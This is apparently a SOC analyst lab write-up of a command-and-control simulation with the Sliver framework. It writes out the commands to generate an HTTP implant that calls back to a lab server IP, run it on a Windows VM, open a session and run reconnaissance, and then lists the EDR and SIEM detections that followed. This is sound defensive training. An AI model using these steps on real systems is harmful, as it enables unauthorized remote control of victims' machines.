# Command and Control (C2) Simulation

This document outlines the steps and observations related to the C2 simulation performed during the SOC Analyst 2.0 Lab using the Sliver framework.

## Overview
Command and Control (C2) is a common adversarial technique used to maintain communication with a compromised system. This simulation demonstrates how a Sliver implant is used to establish a C2 session and simulate adversarial activity on a target system.

---

## Steps Taken

### 1. Generate and Deploy the C2 Implant
- **Verify Implant Storage**:
  - Checked the list of implants stored on the Sliver server by running:

    implants

- **Generate Implant**:
  - Created a Sliver implant using the following command:
    
    generate --http 172.25.114.254 --save /mnt/c/Users/sywtbsa/Downloads/
    
    - The implant was saved in the Windows VM's Downloads directory.

- **Deploy Implant**:
  - Transferred the implant to the Windows VM and executed it via an administrative command prompt:
    
    C:\Users\sywtbsa\Downloads\[your_C2-implant.exe]
    

---

### 2. Establish a C2 Session
- **Verify Implant Connection**:
  - Verified that the implant successfully connected to the Sliver server by running:
    
    sessions
    

- **Interact with the Session**:
  - Interacted with the session by running:
    
    use [session_id]
    

---

### 3. Execute Reconnaissance Commands
- Gathered system information using the following commands:
  - **Identify System Info**:
    
    info
    whoami
    pwd
    
  - **Network Activity**:
    
    netstat
    
  - **Running Processes**:
    
    ps -T
    

---

## Observations
- The implant successfully established a C2 session and allowed interaction with the compromised system.
- Reconnaissance commands revealed:
  - User privileges.
  - Active network connections.
  - Running processes.

---

## EDR and SIEM Insights

### LimaCharlie
- **Process Tree**:
  - LimaCharlie flagged the implant as an unsigned process and highlighted it in green in the process tree.
- **Network Activity**:
  - Telemetry captured the implant’s HTTP communication with the Sliver server.

### Azure Sentinel
- Detection rules flagged:
  - Unusual outbound HTTP traffic.
  - Unauthorized process creation events.

---
